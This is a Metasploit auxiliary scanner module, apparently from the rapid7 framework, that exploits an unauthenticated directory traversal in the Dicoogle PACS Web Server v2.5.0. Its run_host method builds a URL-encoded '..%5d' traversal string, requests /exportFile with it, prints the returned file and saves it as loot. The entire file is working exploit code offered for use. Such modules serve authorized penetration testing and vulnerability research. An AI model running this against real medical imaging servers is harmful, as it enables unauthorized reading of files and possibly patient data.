##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Dicoogle PACS Web Server Directory Traversal',
      'Description' => %q{
        This module exploits an unauthenticated directory traversal vulnerability
        in the Dicoogle PACS Web Server v2.5.0 and possibly earlier, allowing an
        attacker to read arbitrary files with the web server privileges.
        While the application is java based, the directory traversal was only
        successful against Windows targets.
      },
      'References'  =>
        [
          ['EDB', '45007']
        ],
      'Author'      =>
        [
          'Carlos Avila', # Vulnerability discovery
          'h00die' # Metasploit module
        ],
      'License'     => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('FILEPATH', [true, "The path to the file to read", '\\windows\\win.ini']),
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 15 ])
      ])

  end

  def run_host(ip)
    filename = datastore['FILEPATH']
    traversal = "..%5d" * datastore['DEPTH'] << filename

    res = send_request_raw({
      'method' => 'GET',
      'uri'    => "/exportFile?UID=#{traversal}"
    })

    if res && res.code == 200
      print_good("#{res.body}")

      path = store_loot(
        'dicoogle.traversal',
        'text/plain',
        ip,
        res,
        filename
      )

      print_good("File saved in: #{path}")
    else
      print_error("Nothing was downloaded")
    end
  end
end
